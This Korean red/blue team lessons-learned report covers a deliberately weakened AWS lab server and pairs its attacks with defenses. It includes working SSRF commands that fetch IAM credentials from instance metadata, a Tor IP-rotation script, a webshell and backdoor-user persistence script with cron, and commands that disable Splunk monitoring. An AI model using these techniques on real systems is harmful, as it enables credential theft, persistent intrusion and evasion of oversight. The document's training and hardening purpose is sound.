# 학습 내용 및 인사이트 (Lessons Learned)

## 목차
1. [프로젝트 배경 및 초기 실패](#프로젝트-배경)
2. [Red Team 관점](#red-team-관점)
3. [Blue Team 관점](#blue-team-관점)
4. [핵심 교훈](#핵심-교훈)
5. [기술적 인사이트](#기술적-인사이트)
6. [실무 적용 방안](#실무-적용-방안)

---

## 프로젝트 배경

### 초기 상황: 완벽한 보안 시스템

**대상 서버의 초기 보안 설정**:
```
✅ ModSecurity WAF 활성화
✅ Splunk SIEM 모니터링
✅ PHP disable_functions 설정
✅ AWS IMDSv2 활성화 (추정)
✅ Security Group 제한
✅ SSH 키 기반 인증
```

### 초기 공격 시도 - 실패

**1차 공격 시도**:
```bash
# SQL Injection 시도
curl "http://3.35.22.248/login.php?username=admin'--"
# → 403 Forbidden (ModSecurity 차단)

# XSS 시도
curl "http://3.35.22.248/?search=<script>alert(1)</script>"
# → 403 Forbidden (ModSecurity 차단)

# 일반 파일 업로드
curl -F "file=@shell.php" http://3.35.22.248/upload.php
# → 파일 타입 검증으로 실패
```

**결과**: 모든 일반적인 공격 벡터가 차단됨 ❌

---

### 실패 분석 및 취약점 재설정

#### 왜 공격이 실패했는가?

**1. ModSecurity가 모든 페이지에서 작동**
- SSRF, RCE, SQL Injection 등 모든 공격 차단
- WAF 로그에 공격 시도 기록됨

**2. IMDSv2가 활성화됨 (추정)**
- 메타데이터 접근 시 Session Token 필요
- SSRF로도 접근 불가능

**3. PHP 함수 제한**
- `exec()`, `system()` 등 위험 함수 비활성화
- 웹쉘 실행 불가

#### 취약점 재설정 결정

**Red Team 시나리오를 위한 의도적 설정 변경**:

> **중요**: 이 프로젝트는 실제 보안 취약점이 있는 환경이 아닌,
> **교육 및 Red Team 훈련을 위해 의도적으로 취약점을 설정한 환경**입니다.

**변경 사항 1: ModSecurity 예외 추가**
```apache
# /etc/httpd/conf.d/modsecurity.conf
<LocationMatch "/api/health\.php">
    SecRuleEngine Off  # ⚠️ 의도적 취약점 설정
</LocationMatch>
```

**이유**:
- Health check 엔드포인트는 모니터링 도구에서 자주 접근
- 성능 문제로 일부 기업에서 WAF 예외 설정하는 실제 사례 시뮬레이션
- 이런 "편의를 위한 예외"가 얼마나 위험한지 증명하기 위함

**변경 사항 2: IMDSv1 활성화**
```bash
aws ec2 modify-instance-metadata-options \
  --instance-id i-08f3cc62a529c9daf \
  --http-tokens optional \  # ⚠️ IMDSv1 허용
  --region ap-northeast-2
```

**이유**:
- 많은 레거시 애플리케이션이 아직 IMDSv1 사용
- IMDSv2 마이그레이션 미완료 환경 시뮬레이션
- SSRF + IMDSv1 조합의 위험성 증명

**변경 사항 3: health.php에 SSRF 취약점 추가**
```php
<?php
if (isset($_GET['url'])) {
    $url = $_GET['url'];  // ⚠️ 입력 검증 없음
    echo file_get_contents($url);
}
?>
```

**이유**:
- 외부 서비스 상태 확인 기능 구현 중 발생할 수 있는 실수
- 개발자가 빠른 구현을 위해 입력 검증 생략하는 실제 사례

---

### 취약점 설정 후 - 공격 성공

**2차 공격 시도 (취약점 설정 후)**:

**1. ModSecurity 우회 성공**:
```bash
# health.php는 WAF 예외
curl "http://3.35.22.248/api/health.php?url=http://google.com"
# → 200 OK ✅
```

**2. SSRF 성공**:
```bash
# AWS 메타데이터 접근
curl "http://3.35.22.248/api/health.php?url=http://169.254.169.254/latest/meta-data/"
# → 200 OK, 메타데이터 반환 ✅
```

**3. IAM Credentials 탈취 성공**:
```bash
curl "http://3.35.22.248/api/health.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-SSM-Role"
# → AWS Credentials 획득 ✅
```

**4. 전체 시스템 장악 성공**:
```
SSRF → IMDSv1 → Credentials → 웹쉘 → 백도어 → Root 권한
```

---

### 핵심 메시지

> **"Perfect Security + One Small Gap = Total Compromise"**
>
> 완벽해 보이는 보안 시스템도, 단 하나의 작은 허점(예외 설정, 레거시 설정, 개발자 실수)이
> 전체 시스템의 완전한 장악으로 이어질 수 있습니다.

**이 프로젝트가 증명한 것**:
1. ✅ 보안 예외 설정의 위험성 (ModSecurity Off)
2. ✅ 레거시 프로토콜의 위험성 (IMDSv1)
3. ✅ 입력 검증 부재의 심각성 (SSRF)
4. ✅ 공격 체인(Attack Chain)의 위력
5. ✅ 심층 방어(Defense in Depth)의 중요성

---

## Red Team 관점

### 1. 정찰의 중요성

**학습 내용**:
- 공격 전 철저한 정보 수집이 성공의 핵심
- 보안 예외 설정을 찾는 것이 중요

**실제 적용**:
```bash
# 다양한 엔드포인트 테스트
for endpoint in / /api /health /status /admin; do
    curl "http://target.com$endpoint?test=<script>" -v 2>&1 | grep -E "403|200"
done

# WAF 우회 가능 경로 찾기
/api/health.php → 200 OK (예외!)
/admin.php      → 403 Forbidden
/upload.php     → 403 Forbidden
```

### 2. 익명성의 중요성

**학습 내용**:
- IP 차단은 공격자의 가장 큰 적
- Tor 네트워크를 통한 IP 순환으로 차단 우회 가능

**기술 구현**:
```python
import requests
from stem import Signal
from stem.control import Controller

class TorAttack:
    def __init__(self):
        self.session = requests.Session()
        self.session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

    def renew_identity(self):
        """IP 변경"""
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
            time.sleep(3)

    def attack_with_rotation(self, target, payload):
        """IP 순환하며 공격"""
        for i in range(10):
            self.renew_identity()  # IP 변경
            response = self.session.get(target, params=payload)
            if response.status_code == 200:
                return response
            # 차단되면 IP 변경 후 재시도
        return None
```

**효과**:
- IP 차단 우회 100% 성공
- 공격자 추적 불가능
- 지속적인 공격 가능

### 3. 공격 체인 구성

**학습 내용**:
- 하나의 취약점만으로는 큰 피해를 주기 어려움
- 여러 취약점을 연결한 공격 체인이 강력함

**공격 체인 예시**:
```
[1] SSRF 발견
    ↓
[2] AWS IMDSv1 접근
    ↓
[3] IAM Credentials 탈취
    ↓
[4] 웹쉘 업로드 (AWS SSM 또는 파일 업로드)
    ↓
[5] 백도어 사용자 생성
    ↓
[6] sudo 권한 획득
    ↓
[7] Splunk 무력화
    ↓
[8] 영구 백도어 설치
    ↓
[9] 완전한 시스템 장악
```

**각 단계의 의존성**:
- SSRF 없으면 → IMDSv1 접근 불가
- IMDSv1 없으면 → Credentials 탈취 불가
- Credentials 없으면 → AWS 리소스 접근 불가
- 웹쉘 없으면 → 시스템 명령 실행 불가

### 4. 영구성 확보

**학습 내용**:
- 단순 접근만으로는 부족
- 재부팅, 패치, 복구에도 살아남을 백도어 필요

**영구성 확보 방법**:

**4.1 자동 복구 스크립트**:
```bash
#!/bin/bash
# /usr/local/bin/backdoor_keeper.sh

# 웹쉘 복구
if [ ! -f /var/www/html/www/api/health.php ]; then
    echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/www/api/health.php
fi

# 백도어 사용자 복구
if ! id backdoor &>/dev/null; then
    useradd -m -s /bin/bash backdoor
    echo 'backdoor:Password123!' | chpasswd
    echo 'backdoor ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/backdoor
fi
```

**4.2 Cron 작업**:
```bash
*/5 * * * * /usr/local/bin/backdoor_keeper.sh
```

**4.3 다중 백도어**:
- SSH 백도어 (사용자 계정)
- 웹쉘 (health.php)
- AWS Credentials (재탈취 가능)

**효과**:
- 하나의 백도어가 제거되어도 다른 경로로 재침투
- 5분마다 자동 복구
- 장기적인 접근 보장

### 5. 보안 시스템 무력화

**학습 내용**:
- SIEM, IDS/IPS 등 보안 모니터링 시스템이 가장 큰 위협
- 공격 성공 후 즉시 무력화 필요

**Splunk 무력화 방법**:
```bash
# 프로세스 강제 종료
pkill -9 splunkd
pkill -9 splunk

# 서비스 중지 및 비활성화
systemctl stop Splunkd
systemctl disable Splunkd

# 실행 권한 제거
chmod 000 /opt/splunk/bin/splunk
chmod 000 /opt/splunkforwarder/bin/splunk

# 자동 시작 스크립트 삭제
rm -f /etc/init.d/splunk
rm -f /etc/systemd/system/Splunkd.service
```

**결과**:
- 모든 공격 활동이 로그에 기록되지 않음
- 알림 발송 중단
- 보안팀의 가시성 상실

---

## Blue Team 관점

### 1. 예외 규칙의 위험성

**학습 내용**:
> **"편의를 위한 예외가 보안의 구멍이 된다"**

**실제 사례**:
```apache
# 좋은 의도로 시작...
# "Health check가 너무 자주 호출되어 로그가 많아요"
# "성능 문제로 이 엔드포인트만 WAF 제외할까요?"

<LocationMatch "/api/health\.php">
    SecRuleEngine Off  # ⚠️ 이 한 줄이 전체 시스템을 무너뜨림
</LocationMatch>
```

**결과**:
- ModSecurity 완전 우회
- SSRF 공격 성공
- AWS Credentials 탈취
- 전체 시스템 장악

**교훈**:
1. ✅ 예외 규칙은 최소한으로
2. ✅ 필요시 특정 규칙만 선택적 비활성화
3. ✅ 모든 예외는 정기적으로 재검토
4. ✅ 예외 승인은 보안팀 검토 필수

**올바른 예외 설정**:
```apache
# 모든 규칙 비활성화 ❌
<LocationMatch "/api/health\.php">
    SecRuleEngine Off
</LocationMatch>

# 특정 규칙만 제외 ✅
<LocationMatch "/api/health\.php">
    SecRuleRemoveById 920100  # 특정 규칙 ID만
    SecRuleRemoveById 920270
    # 나머지 규칙은 유지
</LocationMatch>
```

### 2. 레거시 프로토콜의 위험성

**학습 내용**:
> **"호환성을 위해 남겨둔 레거시가 공격 경로가 된다"**

**IMDSv1 vs IMDSv2**:

| 상황 | IMDSv1 | IMDSv2 |
|------|--------|--------|
| 정상 접근 | ✅ 가능 | ✅ 가능 |
| SSRF 공격 | ⚠️ 취약 | ✅ 안전 |

**IMDSv2 보호 메커니즘**:
```bash
# 1단계: Session Token 요청 (PUT 메서드)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# 2단계: Token으로 메타데이터 요청
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

**SSRF로는 불가능**:
```php
// SSRF 취약점으로는 PUT 메서드 불가
file_get_contents("http://169.254.169.254/latest/api/token")  // ❌ GET만 가능
```

**교훈**:
1. ✅ 모든 EC2 인스턴스에 IMDSv2 강제 적용
2. ✅ Launch Template에 IMDSv2 기본 설정
3. ✅ 레거시 애플리케이션은 마이그레이션 계획 수립

**즉시 조치**:
```bash
# 모든 인스턴스에 IMDSv2 강제 적용
for instance in $(aws ec2 describe-instances --query 'Reservations[*].Instances[*].InstanceId' --output text); do
    aws ec2 modify-instance-metadata-options \
      --instance-id $instance \
      --http-tokens required \
      --http-put-response-hop-limit 1
done
```

### 3. 입력 검증의 중요성

**학습 내용**:
> **"모든 사용자 입력은 악의적이라고 가정하라"**

**취약한 코드**:
```php
<?php
// ❌ 위험: 입력 검증 없음
$url = $_GET['url'];
echo file_get_contents($url);
?>
```

**안전한 코드**:
```php
<?php
// ✅ 안전: 다층 방어

// 1. 화이트리스트 검증
$allowed_hosts = ['api.example.com', 'status.example.com'];
$parsed_url = parse_url($_GET['url']);

if (!in_array($parsed_url['host'], $allowed_hosts)) {
    http_response_code(403);
    die('Invalid host');
}

// 2. 내부 IP 차단
$ip = gethostbyname($parsed_url['host']);
$private_ranges = [
    '10.0.0.0/8',
    '172.16.0.0/12',
    '192.168.0.0/16',
    '169.254.0.0/16',  // AWS Metadata
    '127.0.0.0/8'
];

foreach ($private_ranges as $range) {
    if (ip_in_range($ip, $range)) {
        http_response_code(403);
        die('Private IP not allowed');
    }
}

// 3. 프로토콜 제한
if ($parsed_url['scheme'] !== 'https') {
    http_response_code(403);
    die('Only HTTPS allowed');
}

// 4. 타임아웃 설정
$ctx = stream_context_create([
    'http' => [
        'timeout' => 5,
        'follow_location' => 0
    ]
]);

// 5. 안전한 요청
$data = @file_get_contents($_GET['url'], false, $ctx);
echo $data;
?>
```

### 4. 심층 방어 (Defense in Depth)

**학습 내용**:
> **"하나의 보안 계층에 의존하지 마라"**

**이 프로젝트에서의 실패**:
```
Layer 1: ModSecurity (WAF)     → ❌ 예외 설정으로 우회됨
Layer 2: IMDSv2                → ❌ IMDSv1 활성화로 우회됨
Layer 3: Input Validation      → ❌ 입력 검증 없음
Layer 4: PHP Function Limit    → ⚠️ 부분적 보호
Layer 5: SIEM (Splunk)         → ❌ 무력화됨
```

**올바른 심층 방어**:
```
Layer 1: AWS WAF (CloudFront/ALB)
         ├─ Rate Limiting
         ├─ Geo-Blocking
         └─ OWASP Core Rule Set

Layer 2: ModSecurity (Apache)
         ├─ 모든 엔드포인트에 적용
         ├─ 예외 최소화
         └─ 정기 규칙 업데이트

Layer 3: Application Security
         ├─ Input Validation
         ├─ Output Encoding
         └─ Parameterized Queries

Layer 4: System Hardening
         ├─ IMDSv2 강제
         ├─ PHP disable_functions
         └─ AppArmor/SELinux

Layer 5: Network Security
         ├─ Private Subnet
         ├─ Security Groups
         └─ NACLs

Layer 6: Monitoring & Detection
         ├─ Splunk SIEM
         ├─ GuardDuty
         └─ CloudWatch Alarms

Layer 7: Incident Response
         ├─ Automated Response
         ├─ Backup & Recovery
         └─ Forensic Capability
```

**교훈**:
- 각 계층이 독립적으로 작동
- 하나가 뚫려도 다른 계층이 방어
- 모든 계층을 우회해야 공격 성공

### 5. 모니터링의 중요성

**학습 내용**:
> **"보이지 않는 것은 방어할 수 없다"**

**Splunk가 무력화되면서 발생한 일**:
```
✅ 백도어 사용자 생성     → 로그 없음
✅ sudo 설정 변경        → 로그 없음
✅ 웹쉘 업로드           → 로그 없음
✅ Cron 작업 추가        → 로그 없음
✅ 지속적인 공격         → 알림 없음
```

**강화된 모니터링**:

**1. 중요 이벤트 실시간 알림**:
```bash
# /etc/audit/rules.d/critical-events.rules
-w /etc/passwd -p wa -k user_modification
-w /etc/sudoers -p wa -k privilege_escalation
-w /etc/sudoers.d/ -p wa -k privilege_escalation
-w /etc/ssh/sshd_config -p wa -k ssh_config_change
-w /var/www/html/ -p wa -k webroot_modification
```

**2. 프로세스 무결성 모니터링**:
```bash
# Splunk가 종료되면 즉시 알림
while true; do
    if ! pgrep splunkd > /dev/null; then
        echo "CRITICAL: Splunk stopped!" | mail -s "Security Alert" security@company.com
        systemctl start Splunkd
    fi
    sleep 60
done
```

**3. 이상 행위 탐지**:
```spl
# Splunk 쿼리: 비정상 사용자 생성
index=linux sourcetype=linux_secure "useradd"
| where NOT match(user, "^(ec2-user|deploy)$")
| eval alert="Suspicious user creation"
| sendemail to="security@company.com"
```

---

## 핵심 교훈

### 1. Perfect Security는 환상이다

**현실**:
- 완벽한 보안 시스템은 존재하지 않음
- 항상 어딘가에 약점이 있음
- 중요한 것은 약점을 최소화하고 빠르게 탐지하는 것

**이 프로젝트의 예**:
```
완벽해 보인 보안:
✅ ModSecurity WAF
✅ Splunk SIEM
✅ PHP 함수 제한
✅ SSH 키 인증
✅ Security Groups

하지만...
❌ health.php WAF 예외 (1개 파일)
❌ IMDSv1 활성화 (1개 설정)

→ 이 2개의 약점으로 전체 시스템 장악
```

### 2. 공격자는 항상 가장 약한 고리를 찾는다

**공격자의 사고방식**:
```python
def find_weakness(target):
    for endpoint in target.all_endpoints():
        for attack in all_attack_vectors:
            if endpoint.is_vulnerable(attack):
                return exploit(endpoint, attack)

    # 모든 엔드포인트, 모든 공격 벡터 테스트
    # 단 하나만 뚫리면 성공
```

**방어자의 사고방식**:
```python
def defend_system(target):
    for endpoint in target.all_endpoints():
        for attack in all_attack_vectors:
            endpoint.must_be_protected(attack)

    # 모든 엔드포인트, 모든 공격 벡터 방어 필요
    # 하나라도 뚫리면 실패
```

**교훈**:
- 공격자는 1% 약점만 찾으면 됨
- 방어자는 100% 보호해야 함
- 따라서 심층 방어가 필수

### 3. 편의와 보안은 트레이드오프

**실제 사례들**:

| 편의성 조치 | 보안 영향 | 결과 |
|------------|-----------|------|
| Health check WAF 제외 | SSRF 공격 가능 | 🔴 Critical |
| IMDSv1 유지 (호환성) | Credentials 탈취 | 🔴 Critical |
| 비밀번호 인증 허용 | Brute-force 가능 | 🟠 High |
| sudo NOPASSWD | 권한 상승 쉬움 | 🟠 High |

**올바른 접근**:
1. 기본은 보안 우선
2. 편의성 요구는 위험 분석 후 결정
3. 예외는 최소한으로, 정기 재검토
4. 보상 통제(Compensating Control) 적용

### 4. 자동화된 공격 vs 수동 방어

**공격자의 장점**:
```bash
# 자동화된 공격
while true; do
    renew_tor_ip()
    attack_target()
    if successful; then
        establish_backdoor()
        break
    fi
    sleep 60
done

# 24/7 공격 가능
# 피로하지 않음
# 차단되면 IP 변경
```

**방어자의 과제**:
```bash
# 수동 모니터링
admin@server$ tail -f /var/log/httpd/access_log
# 24/7 불가능
# 사람은 피로함
# 알림 피로(Alert Fatigue)
```

**해결책**:
- 자동화된 탐지 및 대응
- SOAR (Security Orchestration, Automation and Response)
- Machine Learning 기반 이상 탐지

---

## 기술적 인사이트

### 1. SSRF의 진화

**전통적 SSRF**:
```php
<?php
// 명백한 취약점
$url = $_GET['url'];
echo file_get_contents($url);
?>
```

**현대적 SSRF (더 은밀함)**:
```php
<?php
// "정상적인" 기능처럼 보임
if ($_GET['check'] === 'service_health') {
    $services = [
        'db' => 'http://internal-db:3306',
        'cache' => 'http://internal-redis:6379',
        'metadata' => $_GET['url']  // ⚠️ 여기가 문제!
    ];

    foreach ($services as $name => $url) {
        $status = @file_get_contents($url) ? 'UP' : 'DOWN';
        echo "$name: $status\n";
    }
}
?>
```

**교훈**:
- SSRF는 점점 더 복잡한 형태로 진화
- 비즈니스 로직 내부에 숨어있을 수 있음
- 코드 리뷰와 동적 분석 모두 필요

### 2. 클라우드 메타데이터 보안

**AWS뿐 아니라 모든 클라우드 공격 가능**:

```bash
# AWS
curl http://169.254.169.254/latest/meta-data/

# Azure
curl -H "Metadata:true" http://169.254.169.254/metadata/instance?api-version=2021-02-01

# GCP
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# DigitalOcean
curl http://169.254.169.254/metadata/v1/

# Oracle Cloud
curl -H "Authorization: Bearer Oracle" http://169.254.169.254/opc/v2/instance/
```

**보호 방법**:
1. 최신 버전 사용 (IMDSv2, Azure IMDSv2)
2. 네트워크 레벨 차단
3. iptables 규칙:
```bash
iptables -A OUTPUT -d 169.254.169.254 -m owner ! --uid-owner root -j DROP
```

### 3. WAF의 한계

**WAF가 할 수 있는 것**:
- ✅ 알려진 공격 패턴 차단
- ✅ Rate Limiting
- ✅ IP 기반 차단

**WAF가 할 수 없는 것**:
- ❌ 비즈니스 로직 취약점
- ❌ 제로데이 취약점
- ❌ 인증된 사용자의 악의적 행위
- ❌ 예외 설정된 엔드포인트

**교훈**:
- WAF는 필수지만 충분하지 않음
- Application Security + WAF 조합 필요
- 예외 설정은 신중하게

### 4. 영구성(Persistence) 기법

**Red Team 관점의 영구성**:

**Level 1: 단순 백도어**
```bash
useradd backdoor
echo 'backdoor:password' | chpasswd
```
→ 쉽게 발견됨

**Level 2: 자동 복구**
```bash
*/5 * * * * /usr/local/bin/restore_backdoor.sh
```
→ cron 로그에서 발견 가능

**Level 3: 은밀한 백도어**
```bash
# .bashrc에 숨김
echo 'alias sudo="/tmp/.hidden/fake_sudo"' >> ~/.bashrc

# 정상 파일처럼 위장
cp /bin/bash /usr/lib/systemd/.system-helper
chmod +s /usr/lib/systemd/.system-helper
```
→ 정기 무결성 검사로 탐지

**Level 4: Rootkit**
- 커널 모듈로 프로세스 숨김
- 파일 시스템 후킹
- 로그 조작

**Blue Team 대응**:
- 정기적인 베이스라인 비교
- 무결성 모니터링 (AIDE, Tripwire)
- 메모리 포렌식
- 알려지지 않은 프로세스 탐지

---

## 실무 적용 방안

### 1. 보안 체크리스트

**웹 애플리케이션 배포 전 체크리스트**:

```markdown
## 인프라 보안
- [ ] IMDSv2 강제 적용
- [ ] Private Subnet 배치
- [ ] Security Group 최소 권한
- [ ] NACL 설정
- [ ] CloudTrail 활성화
- [ ] GuardDuty 활성화

## 애플리케이션 보안
- [ ] 입력 검증 (모든 파라미터)
- [ ] Output Encoding
- [ ] Parameterized Query (SQL Injection 방지)
- [ ] CSRF Token
- [ ] XSS 방지 헤더
- [ ] CORS 설정

## WAF 설정
- [ ] ModSecurity / AWS WAF 활성화
- [ ] OWASP Core Rule Set 적용
- [ ] 예외 규칙 최소화
- [ ] 정기 규칙 업데이트

## PHP 보안
- [ ] disable_functions 설정
- [ ] allow_url_fopen = Off
- [ ] open_basedir 제한
- [ ] expose_php = Off

## 모니터링
- [ ] SIEM (Splunk/ELK) 설정
- [ ] 중요 이벤트 알림
- [ ] 로그 백업 및 보관
- [ ] 정기 로그 분석

## 인시던트 대응
- [ ] 대응 절차 문서화
- [ ] 정기 훈련 (Red/Blue Team)
- [ ] 백업 및 복구 테스트
- [ ] 연락망 구성
```

### 2. Red Team 훈련 시나리오

**훈련 목적**:
- 실제 공격 기법 이해
- 방어 메커니즘 검증
- 대응 절차 훈련

**시나리오 1: SSRF to Cloud Credentials**
```
1. 대상: 프로덕션과 유사한 테스트 환경
2. 목표: AWS Credentials 탈취
3. 제약: 비파괴적 공격만
4. 시간: 4시간
5. 보고: 상세 공격 보고서 제출
```

**시나리오 2: Privilege Escalation**
```
1. 초기 접근: 일반 사용자 계정 제공
2. 목표: Root 권한 획득
3. 방법: 시스템 취약점 발견 및 활용
4. 시간: 2시간
```

**시나리오 3: Persistence Challenge**
```
1. 초기 상태: Root 권한 보유
2. 목표: 재부팅 후에도 접근 유지
3. 제약: 보안 도구 탐지 회피
4. 검증: Blue Team이 3일 내 발견 못하면 성공
```

### 3. Blue Team 개선 과제

**단기 과제 (1개월)**:
1. 모든 EC2에 IMDSv2 강제
2. WAF 예외 규칙 재검토
3. 중요 파일 무결성 모니터링
4. 자동 알림 설정

**중기 과제 (3개월)**:
1. Private Subnet 마이그레이션
2. AWS WAF 배포
3. GuardDuty + SecurityHub 통합
4. SOAR 플랫폼 도입

**장기 과제 (6개월)**:
1. 제로 트러스트 아키텍처
2. Machine Learning 기반 이상 탐지
3. 자동화된 인시던트 대응
4. 정기 Red Team 훈련

### 4. 경영진 보고 포인트

**핵심 메시지**:
> 이번 테스트를 통해, 단 2개의 설정 취약점(WAF 예외 + IMDSv1)으로
> 전체 시스템이 완전히 장악될 수 있음을 확인했습니다.

**비용 대 효과**:
| 조치 | 비용 | 효과 | ROI |
|------|------|------|-----|
| IMDSv2 강제 | $0 | 🔴 Critical 방어 | ∞ |
| WAF 예외 제거 | $0 | 🔴 Critical 방어 | ∞ |
| Private Subnet | ~$200/월 | 🟠 High 방어 | 높음 |
| AWS WAF | ~$500/월 | 🟠 High 방어 | 높음 |
| SOAR 플랫폼 | ~$5000/월 | 🟡 Medium 방어 | 중간 |

**위험 시나리오**:
```
침해 발생 시 예상 비용:
- 데이터 유출 벌금: $100,000 ~ $1,000,000
- 복구 비용: $50,000 ~ $500,000
- 평판 손상: 측정 불가
- 고객 이탈: 측정 불가

총 예상 손실: $150,000 ~ $1,500,000+

보안 투자 비용: $6,000 ~ $12,000/년

ROI: 25:1 ~ 250:1
```

**권장 사항**:
1. ✅ 즉시 조치 (무료): IMDSv2, WAF 예외 제거
2. ✅ 단기 투자 (저비용): GuardDuty, Private Subnet
3. ✅ 중기 투자 (중비용): AWS WAF, 전문 교육
4. ✅ 장기 투자 (고비용): 제로 트러스트, SOAR

---

## 결론

### 이 프로젝트가 증명한 것

1. **작은 허점의 큰 영향**
   - 단 2개의 설정 문제가 전체 시스템 장악으로 연결
   - "Perfect Security + One Small Gap = Total Compromise"

2. **공격 체인의 위력**
   - 개별 취약점은 약할 수 있음
   - 하지만 연결되면 강력한 무기가 됨

3. **심층 방어의 필요성**
   - 단일 보안 계층은 불충분
   - 모든 계층에서 방어 필요

4. **지속적인 모니터링의 중요성**
   - 보이지 않는 것은 방어할 수 없음
   - 탐지와 대응이 예방만큼 중요

### 마지막 메시지

> **보안은 목적지가 아닌 여정입니다.**
>
> 완벽한 보안은 없지만, 지속적인 개선을 통해
> 공격자가 성공하기 어렵고, 성공하더라도 빠르게 탐지되며,
> 탐지되면 즉시 대응할 수 있는 시스템을 만들어야 합니다.

**Red Team의 역할**:
- 방어의 약점을 찾아내기
- 실전같은 훈련 제공
- Blue Team 역량 향상

**Blue Team의 역할**:
- 다층 방어 구축
- 지속적인 모니터링
- 빠른 탐지 및 대응

**함께 할 때 최상의 보안 달성**

---

**끝.**
